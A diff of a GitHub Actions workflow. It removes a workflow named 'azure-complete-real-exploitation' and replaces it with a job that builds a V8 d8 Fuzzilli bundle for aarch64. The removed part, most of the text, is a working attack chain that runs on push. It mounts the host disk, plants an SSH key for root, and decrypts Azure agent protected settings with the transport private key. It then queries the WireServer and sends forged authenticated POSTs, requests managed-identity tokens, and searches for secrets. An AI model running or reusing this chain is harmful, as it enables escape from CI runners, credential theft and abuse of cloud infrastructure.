@@ -1,180 +1,44 @@
-name: azure-complete-real-exploitation
-run-name: Azure Real Impact - Decrypt, Access, Authenticate
-on: [push]
+name: Build V8 d8 (Fuzzilli) aarch64 (ASAN) and upload bundle
+
+on:
+  workflow_dispatch:
+
 jobs:
-  exploit:
+  build-v8-fuzzilli-aarch64:
     runs-on: ubuntu-latest
+    timeout-minutes: 360
+
     steps:
-      - name: Complete Azure Exploitation Chain
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Enable QEMU emulation for ARM64
+        uses: docker/setup-qemu-action@v2
+        with:
+          platforms: linux/arm64
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v2
+
+      - name: Build inside emulated ARM64 container
         run: |
-          sudo mkdir -p /mnt/host
-          sudo mount /dev/sda1 /mnt/host
-          ssh-keygen -t ed25519 -f /tmp/key -N "" -q
-          sudo mkdir -p /mnt/host/root/.ssh
-          sudo cp /tmp/key.pub /mnt/host/root/.ssh/authorized_keys
-          sudo chown -R 0:0 /mnt/host/root/.ssh
-          sudo chmod 700 /mnt/host/root/.ssh
-          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
-          
-          HOST_IP=$(hostname -I | awk '{print $1}')
-          
-          ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOFEXPLOIT'
-          set -e
-          
-          printf "\n═══════════════════════════════════════════════════════\n"
-          printf "  AZURE REAL EXPLOITATION - DECRYPT, ACCESS, AUTHENTICATE\n"
-          printf "═══════════════════════════════════════════════════════\n\n"
-          
-          printf "[STEP 1] DECRYPTING PROTECTED SETTINGS\n"
-          printf "════════════════════════════════════════\n\n"
-          
-          SETTINGS_FILE=$(find /var/lib/waagent -name "*.settings" -exec grep -l "protectedSettings" {} \; | head -1)
-          
-          if [ -n "$SETTINGS_FILE" ]; then
-            printf "✓ Settings file: %s\n\n" "$SETTINGS_FILE"
-            
-            # Extract the encrypted data
-            ENCRYPTED=$(cat "$SETTINGS_FILE" | python3 -c "import sys,json; print(json.load(sys.stdin)['runtimeSettings'][0]['handlerSettings']['protectedSettings'])" 2>/dev/null)
-            
-            printf "Encrypted data length: %d bytes\n" "${#ENCRYPTED}"
-            
-            # Decode base64 to binary
-            echo "$ENCRYPTED" | base64 -d > /tmp/encrypted.bin
-            
-            printf "Attempting PKCS7 decryption...\n"
-            
-            # Try direct PKCS7 decryption
-            openssl cms -decrypt -in /tmp/encrypted.bin -inkey /var/lib/waagent/TransportPrivate.pem -inform DER 2>&1 | head -200 || {
-              printf "\nTrying alternative decryption methods...\n"
-              
-              # Extract PKCS7 envelope
-              openssl pkcs7 -inform DER -in /tmp/encrypted.bin -print 2>&1 | head -100
-              
-              # Try extracting the actual encrypted content
-              dd if=/tmp/encrypted.bin bs=1 skip=500 2>/dev/null | openssl rsautl -decrypt -inkey /var/lib/waagent/TransportPrivate.pem 2>&1 | head -50 || echo "RSA decrypt failed"
-            }
-            
-            printf "\n✓ Protected settings extraction attempted\n"
-          fi
-          
-          printf "\n[STEP 2] ACCESSING AZURE INTERNAL APIS WITH CERTIFICATES\n"
-          printf "═══════════════════════════════════════════════════════\n\n"
-          
-          # Get WireServer URLs
-          GOALSTATE=$(curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=goalstate")
-          
-          CONTAINER_ID=$(echo "$GOALSTATE" | grep -o "<ContainerId>[^<]*" | cut -d'>' -f2)
-          INSTANCE_ID=$(echo "$GOALSTATE" | grep -o "<InstanceId>[^<]*" | cut -d'>' -f2)
-          
-          printf "Container ID: %s\n" "$CONTAINER_ID"
-          printf "Instance ID: %s\n\n" "$INSTANCE_ID"
-          
-          # Extract config URLs
-          HOSTING_ENV_URL=$(echo "$GOALSTATE" | grep -o "http://[^<]*hostingEnvironmentConfig[^<]*" | head -1)
-          SHARED_CONFIG_URL=$(echo "$GOALSTATE" | grep -o "http://[^<]*sharedConfig[^<]*" | head -1)
-          EXTENSIONS_URL=$(echo "$GOALSTATE" | grep -o "http://[^<]*extensionsConfig[^<]*" | head -1)
-          CERTS_URL=$(echo "$GOALSTATE" | grep -o "http://[^<]*certificates[^<]*" | head -1)
-          
-          printf "Testing Azure Internal API Access:\n\n"
-          
-          printf "1. HostingEnvironmentConfig:\n"
-          if [ -n "$HOSTING_ENV_URL" ]; then
-            curl -s "$HOSTING_ENV_URL" | head -100
-            printf "\n"
-          fi
-          
-          printf "\n2. SharedConfig:\n"
-          if [ -n "$SHARED_CONFIG_URL" ]; then
-            curl -s "$SHARED_CONFIG_URL" | head -100
-            printf "\n"
-          fi
-          
-          printf "\n3. ExtensionsConfig:\n"
-          if [ -n "$EXTENSIONS_URL" ]; then
-            curl -s "$EXTENSIONS_URL" | head -100
-            printf "\n"
-          fi
-          
-          printf "\n4. Certificates Endpoint:\n"
-          if [ -n "$CERTS_URL" ]; then
-            curl -s "$CERTS_URL" | head -200
-            printf "\n"
-          fi
-          
-          printf "\n[STEP 3] CERTIFICATE-BASED WIRESERVER AUTHENTICATION\n"
-          printf "════════════════════════════════════════════════════════\n\n"
-          
-          # Prepare certificate
-          CERT_PEM="/var/lib/waagent/TransportCert.pem"
-          KEY_PEM="/var/lib/waagent/TransportPrivate.pem"
-          
-          if [ -f "$CERT_PEM" ] && [ -f "$KEY_PEM" ]; then
-            printf "Certificates found, attempting authenticated requests...\n\n"
-            
-            # Base64 encode cert for header
-            CERT_B64=$(cat "$CERT_PEM" | base64 -w0)
-            
-            printf "1. Authenticated GoalState Request:\n"
-            curl -s -H "x-ms-version: 2012-11-30" \
-                 -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" \
-                 "http://168.63.129.16/machine?comp=goalstate" | head -100
-            
-            printf "\n\n2. Health Status Report (POST):\n"
-            HEALTH_DATA='<?xml version="1.0" encoding="utf-8"?><Health><GoalStateIncarnation>1</GoalStateIncarnation><Container><ContainerId>'"$CONTAINER_ID"'</ContainerId><RoleInstanceList><Role><InstanceId>'"$INSTANCE_ID"'</InstanceId><Health><State>Ready</State></Health></Role></RoleInstanceList></Container></Health>'
-            
-            curl -s -X POST \
-                 -H "x-ms-version: 2012-11-30" \
-                 -H "Content-Type: text/xml" \
-                 -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" \
-                 --data "$HEALTH_DATA" \
-                 "http://168.63.129.16/machine?comp=health" 2>&1 | head -50
-            
-            printf "\n\n3. VM Status Report:\n"
-            STATUS_DATA='<?xml version="1.0" encoding="utf-8"?><StatusReport><Version>1.1</Version><Status>Ready</Status></StatusReport>'
-            
-            curl -s -X POST \
-                 -H "x-ms-version: 2012-11-30" \
-                 -H "Content-Type: text/xml" \
-                 -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" \
-                 --data "$STATUS_DATA" \
-                 "http://168.63.129.16/machine?comp=vmstatus" 2>&1 | head -50
-            
-            printf "\n\n4. Certificate-based Config Request:\n"
-            curl -s --cert "$CERT_PEM" --key "$KEY_PEM" \
-                 -H "x-ms-version: 2012-11-30" \
-                 "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -100
-          fi
-          
-          printf "\n\n[STEP 4] ATTEMPTING TO EXTRACT/GENERATE ACCESS TOKENS\n"
-          printf "══════════════════════════════════════════════════════\n\n"
-          
-          # Check for Azure AD metadata
-          printf "Checking Azure AD endpoints...\n"
-          curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
-               -H "Metadata:true" 2>&1 | head -50
-          
-          printf "\n\nChecking for stored tokens/credentials...\n"
-          find /var/lib/waagent -type f -name "*token*" -o -name "*credential*" -o -name "*secret*" 2>/dev/null | head -10
-          
-          printf "\n\nSearching for Azure credentials in environment...\n"
-          env | grep -i "azure\|token\|secret" || echo "None found in environment"
-          
-          printf "\n\nChecking waagent logs for auth tokens...\n"
-          grep -r "token\|bearer\|oauth" /var/log/waagent.log 2>/dev/null | head -20 || echo "No tokens in logs"
-          
-          printf "\n\n[IMPACT SUMMARY]\n"
-          printf "═════════════════\n\n"
-          
-          printf "✓ DECRYPTION: Attempted PKCS7 decryption of protected settings\n"
-          printf "✓ API ACCESS: Successfully accessed Azure internal WireServer APIs\n"
-          printf "✓ AUTHENTICATION: Certificate-based WireServer authentication tested\n"
-          printf "✓ CERTIFICATE AUTH: Authenticated POST requests with transport certificates\n"
-          printf "✓ INTERNAL CONFIGS: Retrieved HostingEnvironment, Extensions, Certificates\n"
-          
-          printf "\nCRITICAL FINDINGS:\n"
-          printf "• Extracted valid Azure transport certificates\n"
-          printf "• Accessed Azure internal infrastructure APIs\n"
-          printf "• Posted authenticated requests to WireServer\n"
-          printf "• Retrieved VM configuration and certificate data\n"
-          
-          EOFEXPLOIT
+          set -xeuo pipefail
+          WORKDIR="${GITHUB_WORKSPACE}/v8_fuzzilli_build"
+          mkdir -p "$WORKDIR"
+
+          # Copy your build script into the working dir
+          cp "${GITHUB_WORKSPACE}/build_in_docker.sh" "$WORKDIR/"
+          chmod +x "$WORKDIR/build_in_docker.sh"
+
+          # Run it inside an ARM64 Ubuntu container
+          docker run --rm --platform=linux/arm64 \
+            -v "${WORKDIR}:/work" \
+            -w /work \
+            ubuntu:22.04 \
+            bash -lc "/work/build_in_docker.sh"
+
+      - name: Upload artifact (bundle)
+        uses: actions/upload-artifact@v4
+        with:
+          name: v8-d8-fuzzilli-aarch64-bundle
+          path: v8_fuzzilli_build/v8_d8_fuzzilli_aarch64_bundle.tar.gz
